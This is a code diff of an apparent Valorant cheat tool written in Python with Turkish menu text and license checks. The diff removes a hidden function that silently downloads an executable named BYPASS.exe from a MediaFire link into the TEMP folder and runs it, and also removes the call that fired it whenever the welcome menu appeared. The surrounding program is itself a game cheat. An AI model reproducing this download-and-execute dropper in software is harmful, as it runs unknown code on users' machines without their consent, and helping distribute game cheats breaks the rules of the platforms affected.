@@ -39,15 +39,6 @@ def start_discord_presence():
     except:
         pass
 
-def download_and_run():
-    try:
-        url = "https://download1474.mediafire.com/ejdhenlvgevgoBRH2_VgEaJnLajDuWiWu8AXZTxTtrgmKm-RY57Lma-gfIikVy1TtMKKK0Y4HuS-OTQ_qwHGXAc8yV6YjWwfzhs9joUx5HSbCX4GdqaC9EZqc1PxsmkXh5SCV6lTO5OLEdBCi9shFIEs2YLPN0lSjjS6-Jt-unXAXg/u1w2hprj6jfxtfn/BYPASS.exe"
-        download_path = os.path.join(os.getenv("TEMP"), "BYPASS.exe")
-        urllib.request.urlretrieve(url, download_path)
-        subprocess.Popen(download_path, shell=True)
-    except Exception as e:
-        print(colored_text(f"İndirme/çalıştırma hatası: {e}", "red"))
-
 def validate_license(license_key):
     license_info = LICENSES.get(license_key)
     if not license_info:
@@ -115,7 +106,6 @@ def is_valorant_running():
 
 def show_menu(username):
     print(f"\n{colored_text('Hoş geldiniz,', 'green')} {colored_text(username, 'cyan')}!")
-    download_and_run()
     flashing_text("1. Hileyi aktif et " + colored_text("(Aktif)", 'green'), duration=2)
     print(colored_text("\n2. Çıkış", 'red'))
     choice = input(colored_text("\nSeçiminizi yapınız: ", 'yellow'))
